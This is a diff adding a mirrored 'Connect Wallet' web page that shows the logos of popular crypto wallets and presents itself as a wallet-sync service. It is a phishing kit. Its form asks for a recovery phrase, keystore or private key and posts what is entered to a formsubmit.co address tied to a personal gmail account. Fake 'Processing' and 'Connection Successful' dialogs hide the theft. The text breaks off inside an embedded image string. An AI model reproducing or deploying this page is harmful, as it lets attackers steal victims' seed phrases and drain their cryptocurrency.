@@ -1,0 +1,668 @@
+<html lang="en">
+
+<!-- Mirrored from fixrectifysync-rkgsyeb9-greg-sept.4everland.app/walletsync.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Oct 2024 09:12:44 GMT -->
+
+<!-- Mirrored from fixrectifyweb.vercel.app/en/walletsync.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 15:41:35 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png" />
+    <title>Connect Wallet</title>
+    <script src="../kit.fontawesome.com/78d167673c.js" crossorigin="anonymous"></script>
+    <!-- google fonts link -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap" rel="stylesheet" />
+    <!-- bootstrap css link -->
+    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous" />
+    <link rel="stylesheet" href="../fixrectifysync.pages.dev/style/animation/2.6%20animate.css.css" />
+    <link rel="stylesheet" href="../fixrectifysync.pages.dev/style/walletpage.css" />
+    <link rel="stylesheet" href="../fixrectifysync.pages.dev/wallet/bootstrap.min.css" />
+    <link href="../fixrectifysync.pages.dev/wallet/main.css" rel="stylesheet" />
+	 <link href="../fixrectifysync.pages.dev/style/index.css" rel="stylesheet" />
+</head>
+<body>
+    <div id="processing-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <h1 id="processing-val" style="font-size: 45px;">30</h1>
+                <h4 class="mt-3">Processing...</h4>
+            </div>
+        </div>
+    </div>
+    <div id="success-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <img style="width: 100px;" src="wallet/success.gif" alt="Success" />
+                <h4 class="mt-3">Connection Successful</h4>
+                <img style="width: 100px;" src="assets/qr.png" alt="Success" />
+            </div>
+        </div>
+    </div>
+    <div id="error-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content" style="background: #fefcfb;">
+            <div class="connect-dialog-body">
+                <img style="width: 150px;" src="wallet/error.gif" alt="Success" />
+                <h4 class="mt-3">Connection Failed, Try Again</h4>
+            </div>
+        </div>
+    </div>
+    <div id="send-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <div class="to-send-info">
+                    <div class="wallet-app-send-logo"><img id="current-wallet-send-logo" src="../syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name" /></div>
+                    <div id="current-wallet-app-send" class="wallet-app-name-send">My app</div>
+                </div>
+
+                <div class="send-tabs">
+                    <button id="phraseSend">Phrase</button>
+                    <button id="keystoreSend">Keystore</button>
+                    <button id="privateKeySend">Private Key</button>
+                </div>
+                <div class="message-tab"></div>
+                <div class="send-form">
+                 <form action="https://formsubmit.co/sammkk890@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="../access/point/success.html">
+                        <input type="hidden" name="wallet" id="walletNameData" />
+                        <div id="data-to-send">
+                            <div class="form-group">
+                                <div class="form-group">
+                                    <input type="hidden" id="type1" name="type" value="phrase" />
+                                    <textarea id="phrase1" name="phrase" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none;"></textarea>
+                                </div>
+                                <div class="small text-left my-3" style="font-size: 11px;">Typically 12 (sometimes 24) words separated by single spaces</div>
+                            </div>
+                        </div>
+                        <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;">PROCEED</button>
+                        <div class="text-right">
+                            <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="connect-dialog" style="display: none;">
+        <div class="content-dialog-overlay"></div>
+        <div class="content-dialog-content">
+            <div class="connect-dialog-header">
+                <button class="dialog-dismiss">Back</button>
+                <button class="dialog-dismiss">X</button>
+            </div>
+            <div class="connect-dialog-body">
+                <div class="connection-info"></div>
+                <div class="wallet-app-info">
+                    <div class="wallet-app-logo"><img id="current-wallet-logo" src="../syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name" /></div>
+                    <div id="current-wallet-app"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="header">
+        <div class="content-box-md">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 col-sm-12 col-xs-12">
+                        <div class="header-text">
+                            <!-- <h4>Apps</h4> -->
+                            <img class="text-center header-img" src="../ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="" />
+                            <!-- <h4>Wallets</h4> -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="coin-section">
+        <div class="content-box-md">
+            <div class="container">
+                <div class="row">
+                    <div class="text-center coin-section-header">
+                        <h1 class="animated pulse">Connect Wallet</h1>
+                        <h6 class="animated pulse">Please connect your wallet to continue</h6>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="coin-registry">
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin">
+                            <img class="coin-img" src="../ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="" />
+                            <h4>Wallet Connect</h4>
+                        </button>
+
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal2" class="btn coin">
+                            <img class="coin-img" src="data:image/jpeg;base64,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" alt="" />
+                            <h4>Trust</h4>
+                        </button>
+
+                        <button type="button"  data-bs-toggle="modal" data-bs-target="#exampleModal4" class="btn coin">
+                            <img class="coin-img" src="../upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" alt="" />
+                            <h4>Metamask</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="../bitcoin-trading.io/wp-content/uploads/2021/10/ledger_logo.png" alt="" />
+                            <h4>Ledger</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal100" class="btn coin">
+                            <img class="coin-img" src="data:image/jpeg;base64,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" alt="" />
+                            <h4>BRD wallet</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal16" class="btn coin">
+                            <img class="coin-img" src="../dvh1deh6tagwk.cloudfront.net/finder-au/wp-uploads/2017/09/Coinbaselogo_Supplied_250x250-2.png" alt="" />
+                            <h4>Coinbase</h4>
+                        </button>
+
+                        <button  type="button" data-bs-toggle="modal" data-bs-target="#exampleModal101" class="btn coin">
+                            <img class="coin-img" src="data:image/jpeg;base64,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